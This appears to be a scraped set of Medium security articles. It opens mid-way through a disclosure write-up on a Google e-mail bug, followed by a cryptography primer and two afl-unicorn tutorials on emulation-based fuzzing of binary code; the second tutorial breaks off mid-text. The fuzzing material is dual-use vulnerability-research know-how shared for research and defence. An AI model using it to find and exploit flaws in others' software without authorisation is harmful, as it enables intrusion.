Only 8.41% of tested addresses were in such database. Also worth noting that all the e-mails I got aren’t necessarily active right now, my list may contain some old and unused addresses. Here are the breaches an e-mail is most likely to be in:- River City Media Spam List (4,98%)- SC Daily Phone Spam List (2,63%)- LinkedIn (2,46%)- Dropbox (1,52%)- MySpace (1,37%)- Adobe (1,33%)- Modern Business Solutions (1,14%)- Special K Data Feed Spam List (1,01%)- Tumblr (0,73%)- Last.fm (0,51%)
This bug could be exploited by malicious people: there are scenarios involving — in the best case scenario — guerrilla marketing campaigns (ie. receiving unsolicited e-mail) or worse, phishing and ransomware attacks, as usual.
02/03/2017 14:54:00 (UTC+1): contact Google with this issue02/03/2017 17:13:00 (UTC+1): Google reply “your report was triaged and we’re currently looking into it.”02/03/2017 17:27:00 (UTC+1): Google reply “ decided to route it internally to a team that deals with similar issues”22/03/2017 00:56:00 (UTC+1): Google reply “We haven’t forgotten about your report; we’re still looking into it and will get back to you in a couple of days.”31/03/2017 16:29:00 (UTC+1): Google decided not to classify this as a security bug ¯\_(ツ)_/¯
Written by
","['Privacy', 'Hacking', 'Google', 'Cybersecurity', 'Cybercrime']"
A Crash Course in Everything Cryptographic - DataSeries - Medium,https://medium.com/dataseries/a-crash-course-in-everything-cryptographic-50daa0fda482?source=tag_archive---------4-----------------------,"Cryptography’s inner workings have long been regarded as exclusive to the realms of experts and mathematicians, its technicalities being largely attributed to magic. Given the complicated nature of the state of modern cryptography, this is understandable. However, through many of the global movements that stem from a lack of understanding on the subject such as the UK’s proposed Encryption Ban and Australia’s Assistance and Access Bill, it is clear that this approach is doing far more harm than good.
In this guide, I will give a crash course in everything that you might need to know to get started in understanding Cryptography. I will give a rundown on the history of various cryptographic systems, and give a crash course on the three most prevalent areas of cryptography: Stream Ciphers, Block Ciphers and Public Key Cryptography.
Ciphers are the cornerstone of cryptography. A cipher is a set of algorithms that performs encryption or decryption on a message. An encryption algorithm (E) takes a secret key (k) and a message (m), and produces a ciphertext (c). Similarly, a Decryption algorithm (D) takes a secret key (K) and the previous resulting Ciphertext (C). They be represented as follows:
This also means that in order for it to be a cipher, it must satisfy the consistency equation as follows, making it possible to decrypt.
This just means that if you encrypt a message with the key K, you would get the exact same message back by decrypting it with K as well.
One of the oldest and simplest ciphers is the Caesar Cipher, which simply replaces each letter in a message with a letter some fixed number of positions down the alphabet.
In the following case, the message has been shifted three characters up:
This cipher can be represented mathematically as follows:
While this meets our definitions of a cipher, it is hardly secure. If an attacker knows that this cipher has been used, they could just try all 25 combinations. Even if they were not sure what cipher has been used, they could figure this out by noticing the pattern of letters in the ciphertext.
To move onto some more secure encryption algorithms, we will have to discuss an operator known as Xor.
An XOR, or ‘Exclusive Or’ gate is a boolean digital logic gate that takes two inputs of 1 or 0, and returns 1 if both inputs are different, or 0 if both are the same. It can be represented with the following truth table covering all possible inputs and outputs:
This operator is often represented with the ⊕ sign. In this notation:
0 ⊕ 0 = 0,
0 ⊕ 1 = 1,
1 ⊕ 0 = 1, and
1 ⊕ 1 = 0.
There are several important properties that apply to Xor.
This implies that a ⊕ b ⊕ a = b, as this equals a ⊕ a ⊕ b which equals 0 ⊕ b which equals b, according to the laws stated above. It’s important to note that this only works on ones and zeroes, so numbers of a different radix must be first be converted to binary.
87 ⊕ 73 = 1010111b ⊕ 1001001b = 0011110b = 30
Now we can move on to our first secure cipher.
Described by Frank Miller in 1882, a One-time pad (also known as a Vernam cipher) works by performing an XOR with a message and a private key, and then using XOR on the private key and the ciphertext to re-obtain the message. This can be done owing to the property described above, that a ⊕ b ⊕ a = b. The pair of algorithms that define the One-time pad can be represented as follows:
The consistency equation for this pair of ciphers can be easily proven as follows:
We’ll do a simple example to show how easy one-time pads can be to use. Say we want to encrypt the word “Message”. The first step would be to convert the message into binary (just ones and zeroes.). We can do this by converting each letter according to the ASCII character set.
We now need 56 random bits to make a key to XOR the clear-text with. It is important that the private key is as random as possible.
We then XOR each of the bits in either message with each-other.
The resulting set of bits is our ciphertext. To decrypt the ciphertext, we simply need to do the same operation, but this time XORing the ciphertext with the same randomly generated key, and then converting it back to ASCII.
This cipher is very simple to use and understand, but it also has another interesting feature about it. The One-time pad has what is known as perfect secrecy, essentially meaning that if an attacker only knew the ciphertext (the result of m⊕k), it is mathematically impossible to know anything about the plain-text message, and it is completely impossible to crack.
So, we have a cipher that is easy to understand and even do by hand, but mathematically impossible to break. Why would we ever want to use anything else? The reason being that while One-time pads are effective and easy to use, they have a number of important downfalls.
The first major issue is that for any message being sent, the private key must be as long as, or longer than the clear-text message. For the recipient to be able to decrypt said message, you must have a way to securely provide them with the private key. If this is the case, then it would simply be easier to transfer the original message across the secure channel.
This problem is exacerbated with the second major drawback which lies within the name. The private key of a One-time pad may only be used one time, meaning that each message being encrypted must use a unique and random key. The major weakness that comes from encrypting multiple messages with the same private key can be demonstrated mathematically quite easily.
Lets say we have two messages, m1 and m2, which we will both encrypt using the same key, K (making our system a two-time pad). We can get the following by XORing both cipher texts together.
From this, we get m1⊕m2. Now an attacker can perform various forms of analysis on the resulting text, such as statistical analysis, frequency analysis, pattern matching, or using a natural language approach as described in this 2006 paper. I won’t get fully into explaining why this is so insecure, but for those interested, this answer here explains it graphically. The more times the same key is used (E.g, a three-time pad or a four-time pad) it is intuitive that the less secure it is.
Now that we’ve gone over the basics of XOR encryption and One-time pads, we can move onto a more practical form of encryption.
The most important takeaway from One-time pads is that they have perfect secrecy, meaning that there are no possible attacks if an attacker is only given the Cipher text. However, having perfect secrecy means that the key length must be equal or greater than the message length. This makes the One time pad impractical because if two parties have a way to secretly agree on a key to encrypt a message, they may as well use that mechanism to transmit the message.
To make the One-time pad more practical, we introduce ‘Stream Ciphers’. The key idea behind a Stream Cipher is to replace the ‘random’ key in a One-time pad with a ‘pseudorandom’ key, meaning that the message is XORed with a key produced with a Cryptographically Secure Pseudo-random number generator or CSPRNG. (Note that this differs from a Pseudo-random number generator, in that data generated from a CSPRNG must be indistinguishable from true randomness).
A CSPRNG is simply an algorithm (or a function) that generates large sequences of numbers, approximating the properties of random numbers. Because random numbers are difficult to generate, CSPRNGs rely on a seed to determine the starting state as well as the numbers generated in the future. They allow for a disproportionately large amount of random numbers to be generated from a comparatively small starting seed (e.g, a 128 bit seed generating gigabytes of random data). If the starting seed is known, then all the subsequent numbers generated are known, meaning that a CSPRNG is deterministic. Because of this, the limit of how random the generated numbers are depends on how random the starting seed is.
To make one time pads practical, we can replace the private key with the desired length of output from a pseudo random number generator, and treat the starting seed as the new private key. Because a CPRNG is deterministic, using the same starting seed the same output will be given.
To clarify, while this is a traditional One-time pad:
Given a Pseudorandom number generator G(K), we replace K as follows:
(Note that this example is only of one type of stream cipher, known as a Synchronous stream cipher. Another related approach is a Self-synchronizing stream cipher, in which several of the previous digits in the ciphertext are used to compute each digit of the encrypting key.)
This is far more practical than the one time pad for a number of reasons, namely that the private key can be much shorter than the message being encrypted, making distribution more manageable. However, this different approach comes with a downside.
By switching the private key for the output of a secure number generator our cipher no longer has perfect secrecy, since the key is shorter than the message. Because of this, how secure a stream cipher is now relies upon how unpredictable our pseudorandom number generator is. If the output of a CSPRNG can be predicted, then the cleartext message can be obtained. Here are a few well known cryptosystems with weak stream ciphers:
802.11b WEP: WEP is an algorithm for encrypting data across WiFi, which used a stream cipher called RC4. Because the same key can not be used more than once in a stream cipher, the long-term secret key was concatenated with a value ‘IV’ which would change every time. However, ‘IV’ was only 24 bits long, meaning that after 5000 messages were encrypted, there is a 50% chance that the same key would be used.
CSS: The Content Scramble System was used by the DVD Forum as a form of Digital Rights Management which would encrypt DVDs, restricting access to the content to only be used in licensed applications. CSS used a 40 bit key which could be brute-forced relatively quickly, owing to the small keyspace of the system. (Although the keys were 40 bits, the system could be cracked after only generating 17 bit combinations owing to the technicalities of the CSPRNG.)
Now that we’ve covered stream ciphers, we can move onto another cryptosystem known as Block Ciphers.
Block Ciphers are another way to encrypt and decrypt data. A Block Cipher consists of two algorithms, E and D for encryption and decryption, which both take a secret key K.
The primary point behind a Block Cipher is that it the length of the input text and the resulting ciphertext is always going to be an equal, fixed amount. This amount is known as the Block Size, and is dependent on which Block Cipher is being used. Additionally, the length of the private key K is known as the Key Size and this is also a fixed amount. Two of the common block ciphers are 3DES which has a Block Size of 64 bits and a Key Size of 168 bits, and AES which has a Block Size of 128 bits and a Key Size of 128, 192 or 256 bits.
Block Ciphers are also known as Keyed Permutations, or Pseudorandom Permutations, as they map every possible block to some other block. It’s important that it is Keyed, as the private key determines which input block maps to its corresponding ciphertext block. Because this is a one-to-one permutation, the ciphertext can be decrypted if the key is known.
The first notable block cipher was the Data Encryption Standard (DES) which was developed during the 1970s at IBM, however it was quickly found to be insecure and replaced with 3DES, but this was soon replaced with the Advanced Encryption Standard (AES), which was developed in 1997 following a call by the National Institute of Standards and Technology for a new standardized block cipher. I’ll be focusing on AES because it is the most common Block Cipher used today, as DES and 3DES are quite weak in comparison.
Lets now look at an overview of how AES works. Note that for simplicity’s sake i’m going to be skipping over lots of the technical details. For those interested, the lecture notes here go very in depth.
AES, and most other Block Ciphers work through iteration, where input text will be iteratively encrypted with a series of keys. The first step is to take a Private Key K as input which is typically 128, 192 or 256 bits (We will just focus on 128 bit AES), and expand it to a series of Round Keys to encrypt our message with.
In this case, we take our 128 bit (16 byte) input key and expand it into 11 seperate 16 byte keys through a Key Expansion function known as a Rijndael key schedule. AES now uses each of these keys by encrypting the message 10 times by passing it through 10 seperate Round Functions R(kₙ, m) which takes a round key kₙ and the message state m as input.
Because AES works on 128 bit blocks, we can represent the input message m as a 4x4 matrix of one-byte cells. We also represent each Round Key as a 4x4 matrix, so that they can be XORed with the cell representing the message state.
Firstly, the input message is XORed with the first Round Key, and then the resulting message state is passed through an function with the steps ByteSub , ShiftRows and MixColumns to update the state of the message (these steps will be explained in a bit). We then repeat these steps 10 times with each of the Round Keys, the only difference being that the MixColumn step is missing from the final round. The final state is then XORed with the 10th round key to produce the output. Here’s a quick overview of each of the three steps involved in a Round:
ByteSub: Each byte in the message state matrix is replaced by its corresponding byte as defined in a Substitution Box shown here:
For example, the byte 9a would be replaced with b8 .
ShiftRow: Each row is shifted a certain amount. The first row is not shifted, the second row is shifted left once, the third row is shifted left twice, and the fourth row is shifted left three times.
MixColumns: A linear transformation is applied to each column in the matrix representing the message state
From here, we can now start to use AES to encrypt data. However, you may be quick to realise one very visible limitation, you cannot use AES to encrypt more than 128 bits of information (or 16 bytes) at a time. To encrypt more than 16 bytes, we need to introduce a concept known as Modes of operation.
There are a variety of methods (or modes of operation) for encrypting more than 128 bits at once. The simplest of such is known as Electronic Codebook, or ECB.
ECB is the simplest mode of operation for encrypting large amounts of data with block ciphers. ECB simply divides a message into 16 bit blocks, and uses the private key to encrypt each of these blocks separately. The plaintext may have to be padded in order to align it with 16 byte boundaries. For example, a 28 byte message would need to have an additional four bytes added to it to make two blocks of 16 bytes. After the message has been divided into its blocks, each block is encrypted individually with the secret key.
While this is quite simple to understand, it comes with a significant downside. Because identical plaintext blocks will produce identical ciphertext blocks, patterns are easy to see. For example: look at the following bitmap image encrypted in ECB mode.
Areas of uniform information are still identical after encryption, and so general patterns can still be discerned. To protect against this, we need to use a more secure mode of operation.
Cipher Block Chaining, or CBC, works very similarly to ECB with a small difference. Before each block of plaintext is encrypted, it is first XORed with the ciphertext of the block preceding it to make each plaintext block unique. For the first block, the plaintext is first XORed with a randomly generated Initialisation Vector.
Using the previous example of the bitmap image encryption, we can intuitively see that this is much more secure.
These are the two main modes of operation that we’ll go over, but there are other ones that you can read up about here if you’re interested.
That’s about all you need to know to get started with Block Ciphers, so now we’re going to move onto our last important area in Cryptography.
All of the encryption techniques that you have learnt up until this point are what’s known as Symmetric Encryption, meaning that only one key is used to encrypt and decrypt data. Public Key Cryptography, also known as Asymmetric Encryption instead uses Key pairs, consisting of ‘Public Keys’ and ‘Private Keys’, allowing for communication across an untrusted channel. This will be explained soon.
Public Key Cryptography is often used to encrypt communications between servers or machines, commonly being used in sending emails, and web browsing. However for the sake of simplicity, we will use the names ‘Alice’ and ‘Bob’ as placeholders for users
Here we have the two users, Alice and Bob, sending and receiving messages with one another. Here we will stick to the analogy of two people exchanging messages, but this can be viewed as a user accessing a website, email servers exchanging messages, or any other secure exchange.
This situation works well, Alice and Bob are able to communicate with each other freely. However, lets say that there were an eavesdropper listening in on the conversation. This eavesdropper can listen in on the messages, but cannot interfere with the data.
Here, all of the data being sent can be seen by the attacker, but it cannot be tampered with. In this situation, Alice and Bob are unable to communicate sensitive or confidential information, as it is all known by the Attacker.
They can try to use Symmetric Encryption, as we have been discussing up until this point, but to no avail.
This is next to useless, as the Attacker can simply intercept the Key, and use that to decrypt the message. Alice and Bob can get around this by using Public Key Cryptography, but now we have to face the question of what this actually is.
Public Key Cryptography works by having users each create a pair of keys: a Public Key, and a Private Key. The Public Key may be spread widely and openly distributed, while the Private Key is known only by the owner. In this system, any person can encrypt a message using the the Public Key of the receiver, but the message can only be decrypted by the Private Key of the recipient.
Because of this, if Bob wanted to send an encrypted message to Alice, he would encrypt it using Alice’s Public Key before sending. Alice could then decrypt the message using her private key. (We’ll get into the technicalities of how this works soon).
One of the reasons that making a switch to Asymmetric Encryption is useful, is that the keys used to decrypt a message are always kept private, and never have to be distributed across a channel for communication. As you can see here, using this technique solves a part of the eavesdropper problem we stated before:
If the attacker were to intercept all the traffic being sent between Alice and Bob, they would not be able to decrypt any information being sent because they do not have access to any of the private keys for decryption.
While this good, it simply leads onto another major security threat. Until this point, we’ve assumed that an attacker can listen in to conversations, but cannot modify the data being sent. However if the attacker in our threat model can alter messages in transit, they could still commit a Man in the Middle Attack. If Alice and Bob are using regular mail in communications, an attacker might work at the post office. Or when using a computer network, an attacker might work for an ISP, or have access to the networking equipment being used.
In this situation, the attacker will store Alice’s Public key and pass on their own Public key to Bob. When Bob encrypts his message intended for Alice, he actually sends it to the Attacker, who will be able to read the message before sending it along to Alice, possible after altering it.
This attack is possible because of two major flaws. A lack of Integrity, and a lack of Authenticity, meaning that there is no way to check that a message has not been interfered with, and that there is no way to verify that a message was sent by the genuine person. These vulnerabilities can be addressed with both Digital Signatures and Certificate Authorities.
A digital signature is a way to ensure that the contents of a message have not been altered and that the message was created by the right person. As stated before, a message encrypted with a person’s Public Key can only be decrypted with their Private Key, but the opposite is also true. A message encrypted with a person’s Private Key can only be decrypted with their Public Key, and so if Alice were to encrypt a message with her Private Key before sending it to Bob, Bob can then decrypt the message with her Public Key, thus confirming that the message was created by someone with access to Alice’s Private Key. This process is known as ‘Signing’.
While this can be done by signing the entire message, it is often more efficient and simpler to sign a Cryptographic Hash of the message and include it in the message body, proving that the message has not changed since it was created.
(Note that this is a massive oversimplification. While the idea of “encrypting with the private key” is approximately the case with RSA, other systems such as Diffie-Hellman or ECC use completely separate Signing algorithms such as ECDSA)
However, this only pushes our problem back slightly. Bob can now securely verify that the message he received was made with the private key of the person he is communicating with and that it has not been tampered with. But, he still cannot verify that the Public Key that he has received truly belongs to Alice. To do this, we need to introduce Certificate Authorities.
A Certificate Authority (or CA) is a trusted third party that will digitally sign and publish the public key bound to a user or entity.
This is done using the Certificate Authority’s own private key, so any person can verify that a certificate was issued in the name of the trusted Certificate Authority. Because of this, trust in another user relies upon the validity of the CA’s key.
In practice, the most common use of these certificates is in securing web traffic. When you navigate to a website that uses HTTPS, you can view the digital certificate in the browser.
This system relies upon trust in the Certificate Authority issuing the Certificate, devices and computers will come with a pre-installed list of trusted Certificate Authorities and their Public Keys.
This article is long enough already so I won’t be going over the technicalities of how the internals of Public Key Cryptosystems work. For those interested, this article explains the internals of RSA, a system that provides both secrecy and signing.
One significant difference between Stream/Block Ciphers and Public Key crypto is that while Stream/Block Ciphers work by doing operations on the individuals bits and bytes of a message, Public Key crypto simply works with numbers. This means that any messages would have to be converted into a number before being encrypted. Because of this, Public Key Crypto is quite inefficient at encrypting large messages. To make this more efficient for large messages, we can combine Symmetric and Asymmetric encryption together, in order to efficiently encrypt large amounts of data with a recipient’s Public Key.
Here is one such method which is used by PGP. The message is encrypted with a Randomly generated key by a Block Cipher, and then that smaller key is encrypted with the receiver’s Public Key. The Ciphertext message is then concatenated with the encrypted random key.
This is far more quick and efficient because Block Ciphers are much faster at encrypting large amounts of data, while an asymmetric cipher is used to encrypt the smaller key which is needed for decryption. This still works as a Public Key Cryptosystem, as the key for decryption can only be obtained by the owner of the Private Key.
Thank you and good job for making it this far, this concludes the article. From here you should have enough of an understanding of Stream Ciphers, Block Ciphers and Public Key Cryptography to appreciate the modern state of encryption and learn more going forward.
For those who want to learn more, I highly recommend completing Stanford’s online Cryptography I Course which gives a great technical and theoretical overview on cryptography. Another useful resource is the book Crypto 101, which goes over many useful areas in Cryptography, and how to exploit common flaws in cryptosystems. Those interested in demonstrating attacks on real-world crypto through practical programming should try the Cryptopals challenges.
Written by
","['Security', 'Cryptography', 'Encryption', 'Privacy', 'Cybersecurity']"
afl-unicorn: Fuzzing Arbitrary Binary Code - HackerNoon.com - Medium,https://medium.com/hackernoon/afl-unicorn-fuzzing-arbitrary-binary-code-563ca28936bf?source=tag_archive---------1-----------------------,"American Fuzzy Lop (AFL) is awesome. It’s easily the best thing out there for quickly doing cutting-edge fuzzing analysis on command line applications. But what about the situations where accessing the stuff you want to fuzz via command line isn’t so simple? Lots of times you can write a test harness (or maybe use libFuzzer instead), but what if you could just emulate the parts of the code that you want to fuzz and still get all the coverage-based advantages of AFL? For example, maybe you want to fuzz a parsing function from an embedded system that receives input via RF and isn’t easily debugged. Maybe the code you’re interested in is buried deep within a complex, slow program that you can’t easily fuzz through any traditional tools.
I’ve created a new ‘Unicorn Mode’ for AFL to let you do just that. If you can emulate the code you’re interested in using the Unicorn Engine, you can fuzz it with afl-unicorn. All of the source code (and a bunch of additional documentation) is available at the afl-unicorn GitHub page.
Clone or download the afl-unicorn git repo from GitHub to a Linux system (I’ve only tested it on Ubuntu 16.04 LTS). After that, build and install AFL as usual, then go into the ‘unicorn_mode’ folder and run the ‘build_unicorn_support.sh’ script as root.
Unicorn Mode works by implementing the block-edge instrumentation that AFL’s QEMU Mode normally does into Unicorn Engine. Basically, AFL will use block coverage information from any emulated code snippet to drive its input generation. The whole idea revolves around proper construction of a Unicorn-based test harness, as shown in the figure below:
The Unicorn-based test harness loads the target code, sets up the initial state, and loads in data mutated by AFL from disk. The test harness then emulates the target binary code, and if it detects that a crash or error occurred it throws a signal. AFL will do all its normal stuff, but it’s actually fuzzing the emulated target binary code!
Unicorn Mode should work as expected with Unicorn scripts or applications written in any of the standard Unicorn bindings (C/Python/Go/Whatever), as long as the at the end of the day the test harness uses libunicorn.so compiled from the patched Unicorn Engine source code that is created by afl-unicorn. So far I’ve only tested this with Python, so please provide feedback and/or patches to the repo if you test this out.
Be aware that building afl-unicorn will compile and install a patched version of Unicorn Engine v1.0.1 on your local system. You’ll have to uninstall any existing Unicorn binaries prior to building afl-unicorn. As with off-the-shelf AFL, afl-unicorn only supports Linux. I’ve only tested it on Ubuntu 16.04 LTS, but it should work smoothly with any OS capable of running both AFL and Unicorn.
Note: This is the same as the ‘simple example’ included in the repo. Please play with it on your own system to see it in action. The repo contains a pre-built MIPS binary of main(), which is demonstrated here.
First, let’s look at the code that we will fuzz. This is just a contrived toy example that will crash really easily in a few different ways, but I’ve extended this to real-world use cases and it works exactly as expected.
Notice that this code by itself it totally bogus. It assumes that data for ‘data_buf’ will magically be located at the address 0x00300000. While this seems strange, this is analogous to lots of parsing functions which assume that they will find data at buffer at a fixed address.
In real-world situations you will need to reverse engineer your target binary to find and identify the exact functionality that you want to emulate and fuzz. In upcoming blog posts I will present some tools to make extraction and loading of process states simple, but for now you will need to do the leg work of getting all the required components up and running in Unicorn.
Your test harness must take the input to mutate via a file specified on the command line. This is the glue that allows AFL to mutate input via its normal interface. The test harness must also forcibly crash itself if it detects a crashing condition during emulation, such as if emu_start() throws an exception. Below is an example test harness which does both of these:
Create a few test inputs and run your test harness on its own to verify that it emulates the code (and crashes) as expected.
Now that the test harness is up and running, create a few sample inputs and run it under afl-fuzz as shown below. Make sure you add the ‘-U’ parameter to specify Unicorn Mode, and I recommend setting the memory limit parameter (‘-m’) to ‘none’ since running a Unicorn script can take quite a bit of RAM. Follow the normal AFL convention of replacing the parameter containing the path of the file to fuzz with ‘@@’ (see AFL’s README for more info)
If all goes according to plan AFL will start up and find some crashes pretty quickly.
You can then run the crashing inputs (found in the results/crashes/ directory) through the test harness manually to learn more about why they crashed. I recommend keeping a second copy of your Unicorn test harness and modifying as necessary to debug the crash in emulation. For example, you can turn on instruction tracing, disassemble along the way using Capstone, dump registers at critical points, etc.
Once you think that you have a valid crash you’ll need to figure out a way to deliver it to the actual program outside of emulation and verify that the crash works on the physical system.
It’s worth noting that the overall fuzzing speed and performance is going to be largely determined by how fast your test harness is. A large, intricate Python-based test harness is going to run much slower than a tight, optimized C-based harness. Make sure to consider this if you plan on running extensive, long-running fuzzers. As a rough point of reference, I found a C-based harness to get 5–10x more executions per second than an analogous Python harness.
While I originally created this to find vulnerabilities in embedded systems (like those found in the Broadcom WiFi chipset by Project Zero and Comsecuris), in my follow-up blog post I’ll release tools and describe a methodology for using afl-unicorn to fuzz emulated functionality in Windows, Linux, and Android processes.
Afl-unicorn can also be used to not only find crashes, but to do basic path finding. In your test harness you can force a crash if a specific instruction is executed (or any other condition you choose). AFL will catch these ‘crashes’ and store the inputs which lead to that condition being met. This can be used as a poor-man’s replacement for symbolic analysis to discover inputs that drill down into deep parsing logic trees.
The makers of Unicorn and Capstone have recently been tweeting images that hint that AFL support may be coming soon…it will be interesting to see what capabilities they have created, and if there is any chance for collaboration to optimize our tools.
I developed afl-unicorn as an internal research project while working as a cyber security researcher at Battelle in Columbus, OH. Battelle is an awesome place to work, and afl-unicorn is just one of many examples of novel cyber security research being done there. For more Battelle-sponsored projects, check out Chris Domas and John Toterhi’s previous work. For information about careers at Battelle, check out their careers page.
Of course none of this would be possible without AFL and Unicorn Engine. Lots of additional inspiration came from Alex Hude‘s awesome uEmu plugin for IDA, and many of the general concepts were borrowed from the NCC Group’s AFLTriforce project.
To continue on, check out afl-unicorn: Part 2 - Fuzzing the ‘Unfuzzable’
Written by
","['About', 'Help', 'Go Home', 'Cybersecurity', 'Fuzzing', 'Afl', 'Exploitation', 'Reverse Engineering']"
afl-unicorn: Part 2 — Fuzzing the ‘Unfuzzable’ - HackerNoon.com - Medium,https://medium.com/hackernoon/afl-unicorn-part-2-fuzzing-the-unfuzzable-bea8de3540a5?source=tag_archive---------4-----------------------,"Unicorn Mode as demonstrated in my previous article is not overly useful on the surface. It has lots of limitations that make it clumsy and slow to employ against most real-world situations. For example, what if the binary you want to emulate calls an imported library function that is likely to call into the kernel such as malloc() or printf()? What if the code you want to fuzz is highly stateful, and requires lots of memory regions (heap allocations, stack pointers, global variables, etc.) that aren’t known until run-time? In fact, just about the only straightforward use of it that I’ve found is when working with flat embedded run-time system memory snapshots recovered from firmware by a debugger.
This article introduces some new tools and techniques that myself and my co-worker Parker Wiksell developed in order to apply afl-unicorn to Windows, Linux, Android, and iOS applications.
Afl-unicorn bridges the gap between the thoroughness of fully manual research (i.e. reading disassembly/source) and the unmatched ease-of-use of AFL. With a little bit of reverse engineering and setup time, afl-unicorn lets you leverage the power of AFL to rapidly discover vulnerabilities in parts of code that you know are suspicious and have a basic grasp of what they do.
Maybe you’re asking yourself, “if I need to do a bunch of reverse engineering, why would I bother taking the time to get afl-unicorn up and running”? In my case it was an easy decision: I consider myself a pretty decent reverse engineer, but I don’t trust my ability to spot all the vulnerabilities in the code I’m reversing. I’ve found myself missing out-of-bounds memory accesses, integer overflows, etc. in the past, and so I’d rather rely on AFL’s mutation engine to do the bug-hunting for me. Also, if you’re going down the path of manual analysis you are going to do the RE legwork anyway, so taking a day or two to spin up afl-unicorn and then letting it run in the background while you keep sifting through code provides bonus, low-cost coverage.
While the original blog post described the basic mechanics behind how afl-unicorn worked and provided a toy example, this post aims to provide a more real-world way to use it against an application that runs on an operating system (such as Windows, Linux, Android, or iOS). In reality, you’ll really want to understand what afl-unicorn does and adapt it to your specific problem to make sure that you don’t get (or know how to identify) false positives and negatives.
The first task is to reverse engineer some basic knowledge about the code you want to fuzz. This includes identifying a good starting and ending point and how that code receives the input that you are going to mutate.
Let’s say that you identify a top-level parsing function for a network packet. Does the function take the packet off the wire as a parameter? How is that passed into the function? Most likely, this will be either through a globally-allocated buffer, a pointer on the stack, or a pointer in a register.
You’ll also want to figure out (as best as you can) what constraints there are on the input. For example, what is the maximum size? Are there any invalid characters? Make sure you think about this in the context of the selected starting address, since these constraints can change over time as the code filters invalid inputs out and allocates buffers of various sizes throughout input handling.
Once all that research is done you’ll want to capture a snapshot of the process at the starting address while handling a valid input. We’ve accomplished this by creating a series of ‘Unicorn Context Dumper’ scripts which, when run while sitting at a debugger breakpoint at the start address, save the entire process memory, register values, and architecture information to a ‘Context Directory’ on disk.
Now you need to write a Unicorn script which loads the process context that you dumped out, loads input to be fuzzed with data read from a file on disk, and emulates from the start to the ending address. If any errors or crashes are detected during emulation this script must forcibly crash itself so that AFL will be able to detect it. We’ve created a set of helper utilities we call the ‘Unicorn Loader’ module that makes most of these tasks easy. The ‘Unicorn Loader’ also includes a full stand-in heap manager which is useful for preventing emulation errors which happen when emulating typical OS applications…More on this later.
Once your Unicorn test harness script can successfully emulate from the start to the end address (and does all the other stuff mentioned above), it’s time to create some valid, non-crashing sample inputs and run it under afl-unicorn as described in the first blog post. With any luck, you’ll see paths being discovered and hopefully some crashes!
Trail of Bits recently released cb-multios, which contains the challenges from DARPA’s Cyber Grand Challenge with additional support libraries that make them easy to compile and run on Linux. In this example I’ll demonstrate how afl-unicorn can be used to fuzz the parsing function of one of the challenges that was specifically designed to be difficult to fuzz, FSK_Messaging_Service:
[…] a service that implements a packet radio receiver with included FSK demodulation front-end, packet decoding, processing, and finally parsing it into a simple messenging service.
The FSK_Messaging_Service challenge was specifically designed to be challenging to fuzz. While the underlying vulnerabilities are fairly straightforward, the bugs exist after extensive parsing and demodulation of simulated analog RF input. In addition, the data itself has a simple 16-bit checksum appended that must be verified before full parsing is performed. From the description of the challenge:
This [challenge binary] presents a number of challenges to a computer reasoning system. The difficulty lies in the transformation of the input set into the processed data after the RF front-end. Due to its very nature fuzzing will be ineffective as RF receivers are naturally subjected to noise and are particularly well suited to identifying signals in the presence of noise[…] This [challenge] is therefore subjectively considered to be hard and designed to test beyond state of the art input reasoning capabilities and solvers.
Here’s a diagram showing the overall logic and data flow of the FSK_Messaging_Service application:
OK. So we can’t fuzz the front-door interface, but with a little bit of analysis of the code (or disassembly if we didn’t have the source) it’s pretty easy to find the function that intuition tells us is most likely to have bugs: cgc_receive_packet() found in packet.c. This function is fairly simple, and does the following:
Here’s a slightly doctored up collection of snippets from the source code showing the relevant parts:
Of course in reality you are very likely to not have the source code available to you. Instead, you’ll have to use traditional reverse engineering methods (static and dynamic analysis) to learn all of the necessary information about the target application.
So now we have our fuzzing target and knowledge of how the input is given:
We also know a simple constraint on the input:
Now we’ll want to get snapshot of the entire process memory as this function is being called to make emulation as simple as possible. This may seem like a heavy-handed approach as opposed to simpler methods (such as the in-place emulation offered by ripr or uEmu), it solves a ton of problems. For example, the global list cgc_g_packetHandlers is populated at run-time so unless we have a run-time state of its memory location the for-loop which iterates over the handlers in cgc_packet_receive() would fail during emulation.
Dumping the entire process memory state and register context is done using a ‘Unicorn Context Dumper’ script. We’ve created several different versions supporting different debuggers including IDA Pro (prior to version 7 for now), LLDB, and GDB with GEF. At the moment only the IDA version is available, but the rest (and any others that get created for other debuggers) will be pushed to GitHub as soon as they are ready. Simply attach IDA Pro’s debugger to a running FSK_Message_Service process, hit a breakpoint at the fuzzing start address, and run the script through IDA (File->Script File…). Note that I’ve only tested this with IDA’s built-in remote debug server. Attaching to other debuggers may present the memory segments differently which would likely lead to errors.
I’ve chosen to set my starting address just before the call to cgc_packet_receive() at a spot where the parameters are conveniently all in registers instead of on the stack. This makes it a little easier to modify them in my Unicorn emulation script.
Once the script completes it generates a ‘Unicorn Context’ directory in the same folder as the IDA database (.idb). This directory contains two things:
Now that we have a starting context to begin emulation from, we write a Unicorn script which loads the context (map all memory regions, load content into them, and set register contents), hooks anything that will break emulation or will impede fuzzing (malloc(), free(), checksum verification, etc.), inlays a new packet into the appropriate places, and emulates the code from start to finish. I’ve created a bare-bones template as an example test harness to start from.
Fast-forwarding a bit, shown below is the complete Unicorn script which can emulate the FSK_Message_Service application’s application-layer packet parsing starting from an initial state loaded from the context directory generated from the Unicorn context dumper. This script relies heavily on functionality imported from the unicorn_loader.py module provided with afl-unicorn. We’ll go over some of the more interesting bits below, but for the most part this follows the basic steps discussed in my previous blog post.
This script has a few unique parts in it that make emulation and fuzzing possible. Each is described in detail below:
Instantiation of Unicorn Engine Instance from Dumped Context: The unicorn_loader.py module provides a new AflUnicornEngine class which derives from the normal UnicornEngine. The constructor takes 3 arguments: path to the context directory, a flag to enable tracing output on STDOUT, and a flag to enable debug output while loading the context to STDOUT.
The AflUnicornEngine class also provides a few additional APIs that are useful in fuzzing test harnesses:
Because this class derives from the base UnicornEngine class you can still use all the normal calls, such as emu_start(), reg_read(), and mem_write(). To see all of the APIs available on the AflUnicornEngine class read through the unicorn_loader module’s source code.
Hooking all heap allocations (malloc()): Calling malloc() during emulation can cause all sorts of problems. It’s possible that the allocator will need to ask the kernel for more memory, but during emulation we there is no such thing as the kernel…so that would result in a crash. In order to prevent this, the Unicorn script hooks any call to malloc(), and instead calls a Unicorn-based implementation that is provided with afl-unicorn in the unicorn_loader.py module. The snippet below shows the code used to do this for the FSK_Messaging_Service binary, which is a 32-bit Linux binary.
